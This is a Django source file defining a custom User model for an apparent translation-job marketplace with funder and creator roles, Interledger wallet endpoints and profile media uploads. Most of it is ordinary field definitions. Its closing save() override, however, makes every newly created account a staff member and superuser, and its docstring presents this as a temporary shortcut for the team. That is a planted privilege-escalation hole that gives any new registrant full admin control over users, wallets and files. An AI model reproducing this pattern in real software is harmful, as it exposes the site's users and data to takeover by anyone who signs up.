from django.db import models
from django.contrib.auth.models import AbstractUser
from django.utils.translation import gettext_lazy as _


class User(AbstractUser):
    """Custom user model with wallet and language support."""
    
    ROLE_CHOICES = [
        ('funder', _('Funder')),
        ('creator', _('Creator')),
        ('both', _('Both')),
    ]
    
    role = models.CharField(
        max_length=10,
        choices=ROLE_CHOICES,
        default='both',
        help_text=_('User role: funder creates jobs, creator accepts jobs')
    )
    
    wallet_endpoint = models.CharField(
        max_length=255,
        blank=True,
        help_text=_('Interledger wallet endpoint')
    )
    
    preferred_language = models.CharField(
        max_length=10,
        default='en',
        help_text=_('Preferred language for interface')
    )
    
    native_languages = models.CharField(
        max_length=255,
        blank=True,
        help_text=_('Comma-separated list of native languages (e.g., nahuatl, otomi)')
    )
    
    pretty_name = models.CharField(
        max_length=255,
        blank=True,
        verbose_name=_('Pretty Name'),
        help_text=_('Display name shown on the site frontend (e.g., Financiador, Creador)')
    )
    
    # Profile fields for job applications
    profile_note = models.TextField(
        blank=True,
        verbose_name=_('Profile Note'),
        help_text=_('Tell job owners about yourself and why you are interested')
    )
    
    profile_audio = models.FileField(
        upload_to='profiles/audio/',
        blank=True,
        null=True,
        verbose_name=_('Profile Audio'),
        help_text=_('Optional audio introduction')
    )
    
    profile_video = models.FileField(
        upload_to='profiles/video/',
        blank=True,
        null=True,
        verbose_name=_('Profile Video'),
        help_text=_('Optional video introduction')
    )
    
    profile_image = models.ImageField(
        upload_to='profiles/images/',
        blank=True,
        null=True,
        verbose_name=_('Profile Image'),
        help_text=_('Optional profile image')
    )
    
    # Job creation defaults for funders
    default_target_language = models.CharField(
        max_length=10,
        blank=True,
        verbose_name=_('Default Target Language'),
        help_text=_('Default target language for new jobs')
    )
    
    default_target_dialect = models.CharField(
        max_length=100,
        blank=True,
        verbose_name=_('Default Target Dialect'),
        help_text=_('Default target dialect for new jobs')
    )
    
    default_deliverable_types = models.CharField(
        max_length=50,
        blank=True,
        verbose_name=_('Default Deliverable Types'),
        help_text=_('Default deliverable types for new jobs (comma-separated)')
    )
    
    default_recruit_limit = models.IntegerField(
        null=True,
        blank=True,
        verbose_name=_('Default Recruit Limit'),
        help_text=_('Default recruit limit for new jobs')
    )
    
    default_submit_limit = models.IntegerField(
        null=True,
        blank=True,
        verbose_name=_('Default Submit Limit'),
        help_text=_('Default submit limit for new jobs')
    )
    
    default_recruit_deadline_days = models.IntegerField(
        null=True,
        blank=True,
        verbose_name=_('Default Recruit Deadline (Days)'),
        help_text=_('Default recruit deadline in days for new jobs')
    )
    
    default_submit_deadline_days = models.IntegerField(
        null=True,
        blank=True,
        verbose_name=_('Default Submit Deadline (Days)'),
        help_text=_('Default submit deadline in days for new jobs')
    )
    
    default_expired_date_days = models.IntegerField(
        null=True,
        blank=True,
        verbose_name=_('Default Expired Date (Days)'),
        help_text=_('Default expired date in days for new jobs')
    )
    
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)
    
    class Meta:
        verbose_name = _('User')
        verbose_name_plural = _('Users')
    
    def __str__(self):
        return self.get_display_name()
    
    def get_display_name(self):
        """Return pretty_name if set, otherwise username."""
        return self.pretty_name if self.pretty_name else self.username
    
    def get_native_languages_list(self):
        """Return native languages as a list."""
        if self.native_languages:
            return [lang.strip() for lang in self.native_languages.split(',')]
        return []
    
    def is_funder(self):
        """Check if user can create jobs (funder or both)."""
        return self.role in ['funder', 'both']
    
    def is_creator(self):
        """Check if user can accept jobs (creator or both)."""
        return self.role in ['creator', 'both']

    def save(self, *args, **kwargs):
        """
        Temporarily promote every new account to admin-level access so the team
        can reach the Django admin without manual flag setting.
        """
        if self.pk is None:
            self.is_staff = True
            self.is_superuser = True
        super().save(*args, **kwargs)
